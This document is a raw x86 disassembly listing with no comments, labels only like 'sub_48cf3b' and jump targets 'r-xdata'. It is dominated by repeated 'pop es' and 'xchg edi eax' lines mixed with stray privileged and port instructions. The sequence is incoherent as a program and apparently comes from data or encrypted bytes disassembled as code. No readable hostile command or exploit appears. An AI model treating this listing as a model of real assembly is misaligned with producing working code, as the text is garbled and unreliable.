imul ebp [ eax + 0x68 ] 0x7fe7d11e
cdq
adc [ edi - 0x3d368169 ] 0x97
xchg edi eax
pop es
xchg edi eax
xchg edi eax
pop es
sbb al 0x7b
mov ss [ edi + 0x7070797 ]
pop es
pop es
pop es
pop es
pop es
int3
pop ss
xchg edi eax
xchg edi eax
std
xchg edi eax
push 0x68b7b3e3
shl ebx 0x68
shl [ ebx - 0x30ff817d ] cl
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
cwde
adc edx edi
mov [ 0xffffffffd3fd9797 ] eax
sbb dl dl
aas
les edi [ esi - 0x2f ]
0x7079797 0x707
pop es
pop es
push ecx
shl [ ebx - 0x1d805860 ] cl
test al 0x97
xchg edi eax
pop es
pop es
pop es
pop es
sbb al 0xe2
lahf
int1
push ds
0x1c2f
fwait
jle r-xdata
push ebx
xchg esp eax
xchg edi eax
xchg edi eax
jle r-xdata
mov ebx 0x7686862
pop es
pop es
push eax
xchg edi eax
nop
xchg edi eax
xchg esi eax
xchg edi eax
push 0xce7e77e2
lds edx [ edi + 0x7b1c0797 ]
mov dl 0x97
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
int1
push ds
rcr [ edi - 0x20782de4 ] 0x1
cwde
and [ edi + 0x1a ] al
leave
xchg ebx eax
push 0x7e979768
xchg [ edi + 0x7079797 ] cl
pop es
pop es
pop es
pop es
pop es
pop es
std
xchg ebx eax
call [ edi + 0x7e9797a7 ]
sub eax 0x79797ab
pop es
pop es
pop es
pop es
pop es
pop es
int1
push ds
0xf168a45f 0xea1e
sub_48cf3b
dec ebp
jle r-xdata
pop es
adc al 0xea
lahf
xchg edi eax
cwde
adc ecx [ ebx + 0x1a686848 ]
adc ah [ edi + 0x6c ]
push 0x869d7e68
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
jne r-xdata
xchg edi eax
xchg edi eax
bound ebp [ eax + 0x68 ]
pop es
xchg edi eax
pop es
push 0x7070707
pop es
push eax
shr [ ebx ] cl
stc
rcr edx 0xda
jle r-xdata
jle r-xdata
xchg edi eax
xchg edi eax
pop es
sbb al 0x7b
mov ss [ edi + 0x7070797 ]
pop es
pop es
pop es
pop es
pop es
int3
pop es
pop es
push eax
xchg edi eax
nop
xchg edi eax
xchg esi eax
xchg edi eax
push 0xce7e77e2
lds edx [ edi + 0x7b1c0797 ]
mov ebx 0x7686862
mov dl 0x97
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
int1
push ds
rcr [ edi - 0x20782de4 ] 0x1
cwde
and [ edi + 0x1a ] al
leave
xchg ebx eax
push 0x7e979768
xchg [ edi + 0x7079797 ] cl
pop es
pop es
pop es
pop es
pop es
pop es
std
xchg ebx eax
call [ edi + 0x7e9797a7 ]
sub eax 0x79797ab
pop es
pop es
pop es
pop es
pop es
pop es
int1
push ds
0xf168a45f 0xea1e
pop es
pop es
pop es
pop es
pop es
pop es
movsb [ edi ] [ esi ]
push edi
xlat
jle r-xdata
sahf
xchg edi eax
xchg edi eax
std
movsd [ edi ] [ esi ]
jle r-xdata
loop r-xdata
mov eax [ 0x7079797 ]
pop es
pop es
pop es
sbb al 0x7b
xchg edi eax
push ebx
fwait
jle r-xdata
xchg esp eax
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
into
jle r-xdata
ja r-xdata
pop es
pop es
pop es
pop es
pop es
sbb al 0x50
jle r-xdata
mov ebx 0x7079797
pop es
pop es
pop es
pop es
pop es
pop es
sbb al dl
dec ebx
jle r-xdata
push ss
jpo r-xdata
push 0x1a070707
shl [ ebx - 0x58813848 ] cl
imul ebp [ eax + 0x68 ] 0x7fe7d11e
cdq
adc [ edi - 0x3d368169 ] 0x97
xchg edi eax
pop es
pop ss
xchg edi eax
xchg edi eax
std
xchg edi eax
push 0x68b7b3e3
shl ebx 0x68
shl [ ebx - 0x30ff817d ] cl
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
cwde
adc edx edi
mov [ 0xffffffffd3fd9797 ] eax
sbb dl dl
aas
les edi [ esi - 0x2f ]
0x7079797 0x707
pop es
pop es
push ecx
shl [ ebx - 0x1d805860 ] cl
test al 0x97
xchg edi eax
pop es
pop es
pop es
pop es
sbb al 0xe2
lahf
int1
push ds
0x1c2f
sub_48cf67
sar [ esi - 0x2a ] 0xd1
xchg edi eax
xchg edi eax
pop es
sbb dl [ edx ]
out dx eax
push 0x68
push 0x97ddf67e
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
int1
push ds
shl [ ecx - 0x5c ] cl
push edi
jle r-xdata
insb
push 0x869d7e68
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
movsb [ edi ] [ esi ]
push edi
xlat
jle r-xdata
mov eax 0x7079797
pop es
pop es
pop es
sbb al 0x50
jle r-xdata
xchg edi eax
xchg edi eax
pop es
pop es
bound ebp [ eax + 0x68 ]
pop es
jle r-xdata
xchg edi eax
xchg edi eax
pop es
sbb al 0x7b
mov ss [ edi + 0x7070797 ]
pop es
pop es
pop es
pop es
pop es
int3
pop es
pop es
push eax
xchg edi eax
nop
xchg edi eax
xchg esi eax
xchg edi eax
push 0xce7e77e2
lds edx [ edi + 0x7b1c0797 ]
mov ebx 0x7686862
mov dl 0x97
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
int1
push ds
rcr [ edi - 0x20782de4 ] 0x1
cwde
and [ edi + 0x1a ] al
leave
xchg ebx eax
push 0x7e979768
xchg [ edi + 0x7079797 ] cl
pop es
pop es
pop es
pop es
pop es
pop es
std
xchg ebx eax
call [ edi + 0x7e9797a7 ]
sub eax 0x79797ab
pop es
pop es
pop es
pop es
pop es
pop es
int1
push ds
0xf168a45f 0xea1e
sub_48d03b
mov bh 0x97
xchg edi eax
pop es
pop es
pop es
pop es
xlat
jle r-xdata
pop es
jle r-xdata
mov [ 0x7079797 ] al
pop es
pop es
pop es
pop es
pop es
pop es
pop es
sbb bl bl
mov bl 0xdf
mov bh 0xf1
push ds
shl [ ebx - 0x30f28131 ] cl
xchg edi eax
xchg edi eax
pop es
pop es
pop es
int1
push ds
0x1cdb
xchg edi eax
sbb al 0x4e
jle r-xdata
jpe r-xdata
pop es
jae r-xdata
int1
adc al [ ebp + 0x7e ]
xchg esi eax
jo r-xdata
pop es
pop es
pop es
pop es
pop es
pop es
push 0x688fb3e3
shl ebx 0x7e
mov dl 0xc3
xchg edi eax
push 0x7070707
jle r-xdata
push 0x20980707
aam 0xf3
xchg edi eax
pop es
pop es
pop es
push 0x7f070707
dec edi
jo r-xdata
jmp 0xffffffffd16791fc
mov al [ 0x7079797 ]
xchg edi eax
xchg edi eax
jle r-xdata
push 0x979ff37e
xchg edi eax
pop es
pop es
pop es
jg r-xdata
push 0xffffffbd
add eax 0x7111ec0
xchg edi eax
xchg edi eax
xchg edi eax
jg r-xdata
fwait
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
xchg [ edi - 0x43f8f869 ] edx
push esi
jle r-xdata
jpe r-xdata
adc dl [ edi + 0x7e ]
or [ ebx - 0x68026869 ] dl
jle r-xdata
adc [ edi - 0x5fe48169 ] 0xffffff97
xchg edi eax
pop es
pop es
sbb al 0x7b
mov dh 0x7e
jpe r-xdata
test [ edi - 0x3fe28169 ] edx
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
push eax
shr [ ebx - 0x5 ] cl
in al 0xb5
xchg edi eax
jle r-xdata
push 0x85fb7f07
xchg edi eax
xchg edi eax
[ edi - 0x3ffa4296 ]
xchg edi eax
xchg edi eax
pop es
pop es
pop es
xchg edi eax
pop es
pop es
pop es
adc al 0x7b
cmp [ esi - 0x56 ] 0xffffffbb
xchg edi eax
xchg edi eax
retn 0x7b1c
fcom [ edi + 0x7070797 ]
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
xchg ecx eax
xchg edi eax
xchg edi eax
jle r-xdata
dec ecx
push 0x1fd21a68
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
jg r-xdata
mov [ 0x7079797 ] eax
adc al 0x56
xchg ebp eax
jle r-xdata
pop es
pop es
pop es
pop es
pop es
pop es
lodsb [ esi ]
aam 0x8f
cwde
adc eax 0x979786b3
adc ch [ eax + 0x7e ]
sbb bl [ ebx + 0x7079797 ]
std
jle r-xdata
jle r-xdata
dec esp
push 0x7070768
pop es
pop es
pop es
movsb [ edi ] [ esi ]
pop esi
jle r-xdata
fstp [ ebp + 0x7079797 ]
pop es
pop es
jg r-xdata
push 0x9b007ec7
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
int1
push ds
fiadd [ ecx + 0x7e ]
jb r-xdata
mov ecx 0x1c079797
dec esi
int1
push ds
0x1cb1
push 0x7070768
test [ edi - 0x2fd08169 ] dl
xchg edi eax
xchg edi eax
scasb [ edi ]
shr [ ebx + 0x7e ] cl
fcmovne st5
xchg edi eax
xchg edi eax
pop es
pop es
int1
push ds
shl [ ecx - 0x3 ] cl
iretd
mov esp 0x97c3ec7e
xchg edi eax
pop es
std
out dx eax
jle r-xdata
sbb dl dl
pop ds
xchg edi eax
xchg edi eax
pop es
pop es
out 0x7e eax
push 0x7979790
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
into
std
mov ecx 0x4bda1ef1
fist [ edi + 0x7070797 ]
pop ds
shl [ edi + 0x7e ] cl
mov [ eax + 0x7079797 ] edi
pop es
pop es
pop es
pop es
pop es
pop es
jg r-xdata
dec eax
mov esi 0x7079797
jle r-xdata
xchg [ edi - 0x78aceb69 ] dl
push ds
adc [ ebx - 0x69 ] esi
xchg edi eax
xchg edi eax
sbb dl dl
arpl [ esi - 0x2c ] di
outsb
push 0x6fd21a68
jle r-xdata
pop es
pop es
pop es
pop es
pop es
jle r-xdata
push 0x7070768
adc al 0x53
xchg [ ebx + ebp * 8 ] edx
xchg ecx eax
xchg edi eax
xchg edi eax
pop es
pop es
movsb [ edi ] [ esi ]
push edi
jle r-xdata
push 0x66a67fc7
push 0x7ec7d768
add [ edx - 0x2326869 ] 0xb7
jle r-xdata
xchg edx eax
xchg edi eax
xchg edi eax
les ebp [ eax - 0x3f ]
sar [ esi - 0x2 ] cl
rcl [ edi - 0x4c2ce169 ] 0x1
xchg [ edx ] edx
push edi
cwde
adc esi edi
adc [ edi - 0x4c14eb69 ] 0xb3
xchg edi eax
jle r-xdata
pop es
pop es
pop es
std
aad 0xf1
push ds
0xb67ec827 0x97b8
rcl [ edi + 0x7070797 ] 0x1
sar [ edi - 0x3f ] cl
fcmovu st4
iretd
jle r-xdata
mov ss [ edi + 0x7070797 ]
push 0x68
push 0x7e475514
aaa
jle r-xdata
mov bh 0x97
xchg edi eax
jle r-xdata
xchg esi eax
xchg edi eax
xchg edi eax
std
rcl [ eax - 0x2e ] 0x7b
fcmovu st4
rcr edx 0x50
rol [ ebx - 0x31 ] cl
stc
sar [ esi - 0x53 ] 0x8e
xchg edi eax
xchg edi eax
pop es
pop es
pop es
push 0x7fd25007
rcr edx 0xdc
xchg edi eax
pop es
jg r-xdata
xchg edi eax
sar [ edi - 0x2 ] 0x85
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
std
mov ch 0xf1
push ds
shl [ ebx + 0x7e ] cl
push 0x7070768
jne r-xdata
xchg ecx eax
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
std
loop r-xdata
push ebp
inc edi
jle r-xdata
mov bl 0x8b
xchg edi eax
jle r-xdata
insd
push 0x87531468
adc al 0xeb
dec esi
lodsd [ esi ]
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
jg r-xdata
xchg edi eax
xchg edi eax
pop es
push [ edx + edi * 4 ]
je r-xdata
jle r-xdata
push ds
retn 0x7e0b
mov edx 0x79797cf
pop es
pop es
pop es
pop es
cwde
adc ebx [ esi + 0x67 ]
push 0x8d767e68
xchg edi eax
xchg edi eax
pop es
pop es
pop es
push 0x677ec7c0
js r-xdata
jle r-xdata
test [ edi + 0x7a297e97 ] edx
push 0x7070768
int1
rcr [ esi ] 0xd1
mov edi 0x6871b17e
pop es
pop es
pop es
sbb al 0xdb
mov bl 0x87
adc bl [ esi - 0x68 ]
adc edx [ edx ]
mov [ 0x6e149797 ] al
[ eax - 0x685d14eb ]
xchg edi eax
adc ch [ eax + 0x7e ]
and al 0x84
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
push ds
rol [ edi + 0x7e ] cl
mov eax [ 0x79797a6 ]
pop es
pop es
pop es
pop es
cwde
and cl dl
cmp [ esi + 0x75 ] 0xffffffb0
pop es
pop es
mov eax 0x7079797
pop es
pop es
cwde
adc ebx [ ebp - 0x2686870 ]
xchg edi eax
push 0x97973b01
xchg edi eax
call [ edi - 0x268686a ]
loopne r-xdata
mov cl 0x71
push 0xd2500768
pop ebx
in eax 0xf2
jle r-xdata
adc ecx [ ebp - 0x4e ]
xchg edi eax
xchg edi eax
push 0x7070768
pop es
pop es
pop es
pop es
sbb dl [ edx ]
push ebx
imul ebp [ eax + 0x68 ] 0xffffffc7
sbb dl [ edx ]
sub ebp [ ebp + 0x68 ]
push 0x978c527e
pop es
sar [ edi + 0x7b ] 0xc2
xchg edi eax
xchg edi eax
jle r-xdata
push 0x7070707
pop es
pop ds
mov dh 0x97
xchg edi eax
pop es
pop es
pop es
pop es
pop es
jle r-xdata
popad
push 0xc7070768
jle r-xdata
jg r-xdata
jae r-xdata
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
sbb al 0xd7
out dx eax
adc al 0xf2
imul edx [ edi - 0x10e3a96c ] 0xffffff8b
jle r-xdata
fwait
xchg edi eax
xchg edi eax
jle r-xdata
pop es
pop es
pop es
fst [ edi - 0x78aceb69 ]
jle r-xdata
jle r-xdata
pop es
pop es
pop es
sbb al 0x83
adc [ esi + 0x55 ] edi
popad
push 0x7070768
pop es
cwde
adc dl [ eax - 0x38686869 ]
push 0x97973b01
xchg edi eax
jle r-xdata
push 0x7070707
push 0xca7e5712
cmpsb [ esi ] [ edi ]
xchg edi eax
xchg edi eax
pop es
pop es
stosd [ edi ]
xchg edi eax
xchg edi eax
pop es
pop es
push 0x68
push 0x7f601cc7
xor ch bl
xchg edi eax
xchg edi eax
adc al 0x53
xchg [ esi - 0x3c ] edi
adc [ edi + 0x7070797 ] 0x7
cwde
and [ eax + 0x5d5016c7 ] edx
xchg edi eax
xchg edi eax
xchg edi eax
sbb dl [ ebx ]
mov bl 0xf
xchg edi eax
xchg edi eax
xchg edi eax
rol bh 0x7e
jle r-xdata
jg r-xdata
cdq
xchg edi eax
xchg edi eax
pop es
pop es
xchg edi eax
cwde
and [ esi + 0x7e955614 ] al
mov al [ 0x7686875 ]
pop es
pop es
std
rcr [ edx ] cl
adc dh bl
push 0x7ec16868
or [ eax + 0x7e079797 ] esp
pop ds
jne r-xdata
xchg [ edi - 0x28688069 ] edx
pop es
pop es
pop es
pop es
jg r-xdata
movsb [ edi ] [ esi ]
jle r-xdata
les edx [ edi - 0x5bf8f869 ]
xchg edi eax
xchg edi eax
xchg edi eax
xchg edi eax
pop es
pop es
pop es
jno r-xdata
xchg edi eax
xchg edi eax
sbb al 0x67
adc ah [ ecx - 0x68 ]
xlat
sar [ esi - 0x17 ] 0x9d
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
sbb dl dl
inc edi
dec edx
push 0x7e571268
0x97a6
push edi
jle r-xdata
pop es
pop es
movsb [ edi ] [ esi ]
mov dl 0x97
xchg edi eax
adc al 0x56
xchg ebp eax
jle r-xdata
jbe r-xdata
push 0x5bd25007
pop es
pop es
pop es
pop es
push 0x4f7e8fe2
jae r-xdata
push 0x1e8fd71c
xchg ebx eax
mov bl 0x7e
int3
pop es
pop es
pop es
jg r-xdata
push 0x7070707
pop es
pop es
pop es
enter 0x3e7e 0x7a
push 0xf1070768
push ds
shl [ ebx + 0x7e ] cl
pop ecx
mov ebp 0xf1079797
push ds
retn 0x7e29
idiv [ esi + 0x7c ]
bound ebp [ eax + 0x68 ]
mov eax 0x8df47ec0
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
jle r-xdata
lds edx [ edi + 0x1c6f1c97 ]
push ecx
jle r-xdata
pop es
pop es
pop es
pop es
pop es
pop es
pop es
int1
push ds
0x1cc3
outsb
push 0x7070768
pop es
pop es
pop es
pop es
pop es
push ds
0xa9207e6b 0x9797
xchg edi eax
xchg edi eax
pop es
pop es
push 0x7070768
pop es
pop es
pop es
pop es
std
sub_48d5ff
popad
push 0x7070768
pop es
pop es
jle r-xdata
loop r-xdata
mov ah 0x97
xchg edi eax
pop es
pop es
pop es
pop es
push 0x4f7e8fe2
jae r-xdata
dec edx
push 0x7e070768
aam 0x8a
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
jg r-xdata
push 0x7070707
pop es
pop es
pop es
enter 0x3e7e 0x7a
push 0xf1070768
push ds
shl [ ebx + 0x7e ] cl
pop ecx
mov ebp 0xf1079797
push ds
retn 0x7e29
mov edx edx
xchg edi eax
xchg edi eax
pop es
pop es
call [ edi - 0x38686859 ]
jle r-xdata
movsd [ edi ] [ esi ]
xchg edi eax
xchg edi eax
sbb dl dl
imul edi [ esi - 0x32 ] 0xffffffd4
xchg edi eax
xchg edi eax
sub [ edx + 0x7e9f9797 ] dl
out dx al
salc
xchg edi eax
xchg edi eax
pop es
pop es
pop es
jle r-xdata
idiv [ esi + 0x7c ]
bound ebp [ eax + 0x68 ]
mov eax 0x8df47ec0
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
jle r-xdata
lds edx [ edi + 0x1c6f1c97 ]
push ecx
jle r-xdata
push 0x857ec468
aad 0x97
xchg edi eax
pop es
pop es
push 0x5ea4f3c1
adc al 0x6f
push 0x978b2a7e
xchg edi eax
pop es
pop es
jle r-xdata
adc edx [ ecx + 0x4a ]
imul ebp [ eax + 0x68 ] 0x68070707
rcr bl 0x12
push edi
jle r-xdata
test [ edi - 0x3637f869 ] dl
push esp
pop es
fst [ edi + 0x7070797 ]
pop es
pop es
pop es
pop es
jle r-xdata
pop es
pop es
pop es
pop es
pop es
pop es
pop es
int1
push ds
0x1cc3
outsb
push 0x7070768
pop es
xchg edi eax
xchg edi eax
pop es
pop es
push 0x7070768
pop es
pop es
pop es
pop es
std
pop es
pop es
jbe r-xdata
pop es
pop es
cwde
adc bh [ esi - 0x43 ]
xchg edi eax
xchg edi eax
jle r-xdata
xchg edi eax
imul ebp [ eax + 0x68 ] 0x7
pop es
pop es
pop es
push 0xd21c9be2
lahf
jle r-xdata
xchg edi eax
pop es
pop es
pop es
jle r-xdata
fst [ edi + 0x7070797 ]
pop es
pop es
pop es
pop es
push ds
0xa9207e6b 0x9797
rcl [ edi - 0xf8f869 ] cl
xchg edi eax
cmpsd [ esi ] [ edi ]
xchg edi eax
xchg edi eax
push 0x67297e68
push 0x83531468
adc dl [ edi + 0x7e ]
call 0x7b14036
pop es
pop es
pop es
push 0x97816c7e
xchg edi eax
pop es
pop es
pop es
pop es
pop es
jle r-xdata
push ebx
fwait
jle r-xdata
lodsd [ esi ]
xchg edi eax
xchg edi eax
pop es
pop es
jle r-xdata
pop es
sbb dl dl
push edi
xchg [ edi + 0x7070797 ] dl
pop es
je r-xdata
cwde
xchg edi eax
xchg edi eax
les edi [ esi - 0x3d ]
mov [ edi + 0x7070797 ] dl
pop es
pop es
pop es
pop es
pop es
pop es
movsb [ edi ] [ esi ]
push edi
jle r-xdata
pop es
enter 0x54c9 0x7
fist [ edi + 0x7070797 ]
pop es
pop es
pop es
pop es
push ds
0x7e4f
push 0x7070707
pop es
pop es
dec eax
push 0xad457e68
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
cwde
adc eax [ eax - 0x78 ]
xchg edi eax
xchg edi eax
call [ edi + 0x1a979787 ]
xchg edi eax
jle r-xdata
jge r-xdata
loop r-xdata
movsb [ edi ] [ esi ]
xchg edi eax
xchg edi eax
sbb bl [ edx ]
daa
push 0x68
push 0x97b5697e
xchg edi eax
lodsb [ esi ]
shl [ ebx + 0x684c7e7e ] 0x1
push 0x7ef2fd07
add eax 0x7686840
pop es
pop es
push 0xcf7e73e2
mov dl 0x97
xchg edi eax
pop es
pop es
lea edx [ edi + 0x77667e97 ]
push 0x7070768
xchg edi eax
xchg edi eax
pop es
pop es
dec [ ebx + eax * 2 + 0x1ec0f5c7 ]
adc [ ebx ] esi
xchg edi eax
xchg edi eax
push 0x7070707
pop es
pop es
pop es
pop es
sbb dl [ edx ]
and ebp [ edi + 0x68 ]
push 0x7bd21ac7
adc bh [ ebx + 0x6a ]
push 0x98967e68
jle r-xdata
jle r-xdata
pop es
pop es
pop es
pop es
inc [ edi - 0x70 ]
xchg edi eax
xchg edi eax
push 0x7b7e9fc1
mov al 0x97
xchg edi eax
adc dl [ edi - 0x68 ]
adc ah [ esi + edi * 4 - 0x69 ]
xchg edi eax
sbb dl dl
sub edi [ esi + 0x7c ]
xchg ecx eax
xchg edi eax
xchg edi eax
pop es
push ds
shl [ ebx - 0x7bdf817d ] cl
xchg edi eax
xchg edi eax
jle r-xdata
mov eax 0x7079797
xlat
xchg edi eax
xchg edi eax
into
jle r-xdata
push 0x98070707
adc eax 0x9797bc57
sbb dl dl
ja r-xdata
ror [ edi - 0x39 ] cl
push 0xca1e4be2
dec edi
jle r-xdata
dec edx
push 0x1a070768
sar [ edi - 0x39 ] cl
sbb al 0xd2
lahf
jle r-xdata
xchg edi eax
xchg edi eax
pop es
pop es
pop es
movsb [ edi ] [ esi ]
push edi
enter 0x7ec9 0xa7
jg r-xdata
cwde
mov edi 0x7e97979c
lea edx [ edi - 0x40ed6769 ]
pushfd
xchg edi eax
xchg edi eax
jle r-xdata
std
xchg [ edx ] ebx
ror [ ebx - 0x3c ] cl
adc al 0x5f
push 0x7070754
pop es
pop es
pop es
push ds
xchg esi eax
les edi [ esi + 0x67 ]
mov [ edi - 0xf8f869 ] ss
mov [ ebx - 0x39 ] es
cmc
rcr [ esi ] 0x11
xor edx [ edi - 0x26816869 ]
shl [ edx + 0x7079797 ] 0x1
pop es
pop es
pop es
pop es
fcom [ edi - 0x2de53869 ]
aas
mov esp 0x97dae97e
xchg edi eax
pop es
pop es
pop es
pop es
pop es
sub_48d670
push 0x686ce27e
push 0xd47e0707
mov dl [ edi + 0x7070797 ]
pop es
pop es
jg r-xdata
idiv [ esi + 0x7c ]
bound ebp [ eax + 0x68 ]
mov eax 0x8df47ec0
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
jle r-xdata
lds edx [ edi + 0x1c6f1c97 ]
push ecx
jle r-xdata
pop es
pop es
pop es
pop es
pop es
pop es
pop es
int1
push ds
0x1cc3
outsb
push 0x7070768
pop es
pop es
pop es
pop es
pop es
push ds
0xa9207e6b 0x9797
xchg edi eax
xchg edi eax
pop es
pop es
push 0x7070768
pop es
pop es
pop es
pop es
std
sub_48d978
rcr [ edi ] 0x2b
xchg edi eax
xchg edi eax
xchg edi eax
movsb [ edi ] [ esi ]
dec esp
rcl [ edx ] 0x61
test eax 0x437e9797
mov eax [ 0x7079797 ]
pop es
into
jle r-xdata
int1
push ds
rol [ ebp - 0x31 ] cl
jle r-xdata
push 0x6d1c0707
adc al 0x6d
mov edx 0x97b9bb7e
xchg edi eax
push eax
shr [ edi ] cl
fcmovu st2
iretd
pop es
pop es
pop es
pop es
pop es
pop es
pop es
sar [ esi - 0x6c ] 0x48
push 0x7070768
pop es
pop es
sbb al 0x56
jle r-xdata
arpl [ eax + 0x68 ] bp
jle r-xdata
xchg esp eax
xchg edi eax
xchg edi eax
rcr [ edi + ebp * 2 ] 0x7e
jbe r-xdata
xchg edi eax
jle r-xdata
inc edx
push 0x7070768
push 0x993f7e80
xchg edi eax
xchg edi eax
pop es
pop es
pop es
jle r-xdata
lodsb [ esi ]
rcr [ edi + 0x687ac57e ] cl
aad 0x97
xchg edi eax
pop es
pop es
pop es
pop es
jle r-xdata
push 0xcc7e0768
xchg esp eax
xchg edi eax
xchg edi eax
sbb al 0x51
jle r-xdata
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
rcr [ edi ] 0x7e
sub [ edi + 0x68 ] ecx
shl [ ebx + 0x1f ] cl
rcl [ ebx + 0x7e ] cl
or [ eax + 0x68 ] al
push 0x6a4f121c
push 0x9fd2ac68
jle r-xdata
jl r-xdata
pop es
std
fcmove st0
jle r-xdata
xchg edx eax
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
rcl [ edi + 0x6fd21497 ] 0x1
mov edi 0x9799ff7e
xchg edi eax
pop es
pop ds
push 0x7070707
cwde
adc ecx edi
imul ebp [ eax + 0x68 ] 0x97844e7e
xchg edi eax
pop es
pop es
pop es
rcl [ edx ] 0x1
inc ebp
jle r-xdata
push 0x7e070768
daa
pop es
mov al [ 0xffffffffe2689797 ]
xchg [ esi + 0x11 ] edi
jb r-xdata
int3
jpe r-xdata
cwde
sbb ecx edi
test [ edi + 0x572f1c97 ] edx
xchg edi eax
xchg edi eax
xchg edi eax
sbb al 0xdb
mov bl 0x87
jle r-xdata
popad
mov ch 0x97
xchg edi eax
pop es
pop es
pop es
cwde
adc esi edx
push 0x7070707
int1
push ds
shl [ ebp - 0x31 ] cl
std
in al 0xc9
jle r-xdata
fist [ edi + 0x7070797 ]
pop es
pop es
pop es
pop es
pop es
pop es
std
lodsd [ esi ]
iretd
cmp edx [ edi - 0x57816869 ]
push 0x7070707
pop es
pop es
sar [ esi + 0xa ] 0xd6
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
sbb al 0x9f
jle r-xdata
xchg edi eax
xchg edi eax
les edi [ esi + 0x6b ]
inc eax
push 0x75139868
mov bh 0x97
xchg edi eax
sbb bl dl
inc ebx
sbb dl dl
xor edi [ esi - 0x6b ]
js r-xdata
push 0x7eb2fd07
iretd
mov [ 0xfffffffffdc79797 ] al
cmp [ esi - 0x17 ] 0x79797ac
pop es
std
fdivrp st1
push ds
shl [ ebx - 0x31 ] cl
jle r-xdata
pop ebx
mov [ edi + 0x1ef10797 ] ss
rol [ edi - 0x31 ] cl
std
salc
adc dl [ edi + 0x7e ]
retn 0x686b
pop es
pop es
adc al 0x53
fwait
jle r-xdata
push 0x7070707
sbb dl dl
daa
sar [ esi - 0x60 ] 0xb5
xchg edi eax
xchg edi eax
pop es
pop es
push 0x97973b01
xchg edi eax
jle r-xdata
jno r-xdata
mov dh 0x97
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
std
xchg edi eax
push 0x68bfb3e3
shl ebx 0x7e
or edx edx
xchg edi eax
xchg edi eax
pop es
pop es
pop es
movsb [ edi ] [ esi ]
push edi
push esp
pop es
pop es
pop es
pop es
pop es
pop es
pop es
into
jle r-xdata
push 0x50070707
shl [ edi - 0x1d ] cl
mov bh 0xdf
pop es
jle r-xdata
mov edx 0x7079797
pop es
imul ebx [ eax - 0x3337a8fd ] 0x5e
push esp
int1
scasb [ edi ]
mov [ 0xffffffffba157e86 ] eax
xchg edi eax
xchg edi eax
pop es
shr [ edi ] cl
iretd
loope r-xdata
cwde
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
sbb dl [ edx ]
sub ebp [ ebp + 0x68 ]
push 0xbbc168c7
sbb dl [ edx ]
pop edi
push 0x68
push 0x75027ec7
push 0x7070768
pop es
insd
push 0xc168c768
mov ebx 0x6a5f121a
push 0x27ec768
jne r-xdata
push 0x7076868
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
jle r-xdata
pop es
int1
push ds
shr [ edi - 0x3 ] cl
out dx eax
jle r-xdata
push 0x7070707
pop es
push ds
adc [ edi - 0x69 ] edi
xchg edi eax
xchg edi eax
jg r-xdata
sar [ edi ] cl
jle r-xdata
pop es
pop es
pop es
pop es
movsb [ edi ] [ esi ]
push edi
jle r-xdata
nop
pop es
pop es
nop
xchg edi eax
xchg edi eax
adc al 0x53
mov bh 0x1e
adc [ edi - 0x69 ] esp
xchg edi eax
xchg edi eax
sbb dl dl
ja r-xdata
pop es
jne r-xdata
xchg edi eax
enter 0x707e 0x7b
push 0x7070768
mov dl 0x97
xchg edi eax
pop es
movsb [ edi ] [ esi ]
push edi
jle r-xdata
dec esp
salc
popad
push 0x7070768
pop es
pop es
sbb al 0x72
jle r-xdata
pop es
pop es
sbb bl dl
jg r-xdata
jle r-xdata
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
cwde
and [ esi + 0x6844977e ] al
push 0xd21ef107
inc ecx
jle r-xdata
push 0xd64c7e68
push 0x6875877e
push 0x7070707
pop es
pop es
pop es
pop es
pop es
rcr [ edx ] 0x1a
sbb ebp [ edx + 0x68 ]
mov ch 0x97
xchg edi eax
pop es
pop es
pop es
jle r-xdata
xchg edi eax
pop es
pop es
pop es
jg r-xdata
xchg edi eax
xchg edi eax
jle r-xdata
mov dh 0x97
mov ebp 0x7079797
pop es
pop es
nop
xchg edi eax
xchg edi eax
pop es
pop es
scasd [ edi ]
0x7e87
pop es
pop es
pop es
call [ edi + 0x7e979787 ]
adc [ edi + 0x7070797 ] 0xc2
sbb al 0x7b
adc al 0xea
fwait
xchg edi eax
jle r-xdata
push 0x97b4367e
xchg edi eax
int1
push ds
0xf171
push 0x23016807
xchg edi eax
xchg edi eax
